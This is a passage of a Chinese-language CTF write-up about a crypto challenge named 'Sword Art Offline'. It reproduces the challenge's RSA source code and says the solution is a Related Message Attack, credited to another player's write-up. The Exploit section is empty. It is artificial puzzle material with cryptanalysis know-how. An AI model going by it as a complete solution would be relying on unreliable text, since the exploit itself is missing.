      \>                Sword Art Offline
    
"""
)

from Crypto.Util.number import *
from random import random
from time import sleep
from secret import FLAG

flag = bytes_to_long(FLAG)
p = getPrime(1024)
q = getPrime(1024)
n = p * q
print(f'{n = }')

assert 2*n > flag > 0

def starburst(x: int):
    return (x * 0x48763 + 0x74) % n


def isBurst() -> bool:
    return True


sleep(10)

for i in range(16):
    flag = starburst(starburst(flag))
    if isBurst():
        print(pow(flag, 0x487, n))
```
:::
#### Recon
這一題是賽後解，也是看了@ywc大[^ywc]的WP，其實很簡單，就是一個簡單的[Related Message Attack](https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack)，題目甚至也沒什麼變，
#### Exploit
## Reference
[^ywc]:[ywc大大的WP](https://hackmd.io/@ywChen/ryxg6zhFT#Babypwn2024-Nerf)